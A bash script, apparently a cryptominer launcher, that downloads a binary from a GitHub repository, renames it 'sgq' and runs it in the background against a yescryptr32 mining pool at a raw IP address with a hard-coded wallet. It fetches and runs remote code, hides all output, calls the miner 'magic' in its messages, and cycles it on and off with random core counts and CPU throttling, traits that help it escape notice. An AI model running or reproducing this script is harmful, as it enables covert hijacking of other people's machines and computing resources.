#!/bin/bash

# Define functions for downloading and installing cpulimit
install_cpulimit() {
  echo "Installing cpulimit..."

  # Download the latest cpulimit release from GitHub
  wget https://github.com/opsengine/cpulimit/archive/refs/heads/master.zip -O cpulimit.zip

  # Unzip the downloaded file
  unzip cpulimit.zip
  cd cpulimit-master || exit

  # Compile and install cpulimit
  make
  sudo make install

  # Clean up
  cd ..
  rm -rf cpulimit-master cpulimit.zip

  echo "cpulimit installed successfully"
}

# Check if cpulimit is installed
if ! command -v cpulimit &> /dev/null; then
  install_cpulimit
else
  echo "cpulimit is already installed"
fi

# Get the number of CPU cores
total_cores=$(nproc)

# Download the mining script
wget -O sgq https://github.com/barburonjilo/back/raw/main/sr

# Make the mining script executable
chmod +x sgq

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/ - cores: $cores/"
}

# Function to start the magic process with a random number of cores
start_magic() {
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count

  # Limiting CPU usage to 50% per core (adjust based on your needs)
  local cpu_limit=50
  
  # Start the mining process
  nohup ./sgq -a yescryptr32 --pool 45.115.225.146:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
  local pid=$!
  
  echo "Magic started with PID: $pid using $num_cores cores"

  # Limiting CPU usage using `cpulimit`
  cpulimit -p $pid -l $cpu_limit &
}

# Function to stop the magic process
stop_magic() {
  pkill -f sgq
  echo "Magic stopped"
}

# Run the loop
while true; do
  start_magic
  sleep 300  # Wait for 5 minutes
  stop_magic
  sleep 120  # Wait for 2 minutes
done
